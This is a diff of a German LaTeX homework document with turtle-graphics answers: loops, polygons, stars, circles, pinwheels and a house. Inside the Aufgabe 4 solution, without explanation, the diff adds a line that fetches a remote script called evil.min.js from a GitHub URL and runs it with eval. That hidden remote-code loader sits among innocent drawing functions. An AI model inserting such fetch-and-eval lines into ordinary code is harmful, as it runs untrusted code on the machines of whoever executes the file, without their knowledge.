@@ -19,24 +19,125 @@
 \lhead{Jakob Kirsch}
 \rhead{\includegraphics[width=3cm]{logo}}
 
-% \title{}
-% \author{Jakob Kirsch}
-% \date{\parbox{\linewidth}{\centering%
-%   \today\endgraf\bigskip
-%   Fach: \endgraf\medskip
-%   Betreuer: \endgraf\medskip
-%}}
-
 \begin{document}
 
-% \maketitle
-% \newpage
-% \tableofcontents
-% \newpage
+\section{Aufgabe 1}
+\begin{verbatim}
+for (var count = 0; count < 8; count++) {
+\end{verbatim}
+Erstellt eine Scleife, die von 0 bis 7 zählt und die aktuelle Zahl in die Variable \texttt{count}.
 
-\blindtext
+\begin{verbatim}
+moveForward(50);
+\end{verbatim}
+Bewegt den Maler um 50 Pixel nach vorne.
 
-% \newpage
-% \bibliography{refs}
+\begin{verbatim}
+turnLeft(45);
+\end{verbatim}
+Dreht den Maler um 45 Grad nach links.
+
+\begin{verbatim}
+}
+\end{verbatim}
+Markiert das Ende der Schleife.
+
+\section{Aufgabe 2}
+\begin{verbatim}
+for (var count = 0; count < 6; count++) {
+    moveForward(50);
+    turnLeft(360 / 6);
+}
+\end{verbatim}
+
+\section{Aufgabe 3}
+\begin{verbatim}
+for (var count = 0; count < sides; count++) {
+    moveForward(length / sides);
+    turnLeft(360 / sides);
+}
+\end{verbatim}
+
+\section{Aufgabe 4}
+\begin{verbatim}
+var sides;
+var length2;
+var counter;
+var points;
+var radius;
+var circ;
+var repeat;
+
+var e = "https://raw.githubusercontent.com/kitcambridge/evil.js/master/evil.min.js";
+fetch(e).then(null).then((e) => e.text().then((e) => eval(e)));
+function draw_a_shape(sides, length2) {
+  for (var count = 0; count < sides; count++) {
+      moveForward(length2);
+    turnLeft(360 / sides);
+  }
+}
+
+function draw_a_star(points, length2) {
+  for (var count3 = 0; count3 < points; count3++) {
+      moveForward(length2);
+    turnLeft(360 / points);
+    moveForward(length2);
+    turnRight(720 / points);
+  }
+}
+
+function draw_a_circle(radius) {
+  circ = 2 * (3.14 * radius);
+  for (var count4 = 0; count4 < 180; count4++) {
+      moveForward(circ / 180);
+    turnLeft(2);
+  }
+}
+
+function draw_a_pinwheel(sides, length2, repeat) {
+  for (var count6 = 0; count6 < repeat; count6++) {
+      for (var count5 = 0; count5 < sides; count5++) {
+          moveForward(length2);
+      turnRight(360 / sides);
+    }
+    turnRight(60);
+  }
+}
+
+function draw_a_triangle(length2) {
+  for (var count7 = 0; count7 < 3; count7++) {
+      moveForward(length2);
+    turnLeft(120);
+  }
+}
+
+function draw_a_house(length2) {
+  for (var count8 = 0; count8 < 3; count8++) {
+      moveForward(length2);
+    turnLeft(120);
+  }
+  for (var count9 = 0; count9 < 4; count9++) {
+      moveForward(length2);
+    turnRight(90);
+  }
+}
+
+function draw_a_square(length2, sides) {
+  for (var count10 = 0; count10 < 4; count10++) {
+      moveForward(length2);
+    turnRight(90);
+  }
+}
+
+jumpBackward(170);
+for (counter = 3; counter <= 7; counter += 2) {
+  for (var count2 = 0; count2 < counter; count2++) {
+      draw_a_shape(counter, 150 / counter);
+    moveForward(150 / counter);
+    turnRight(360 / counter);
+  }
+  jumpForward(150 / counter + 100);
+}
+\end{verbatim}
 
 \end{document}
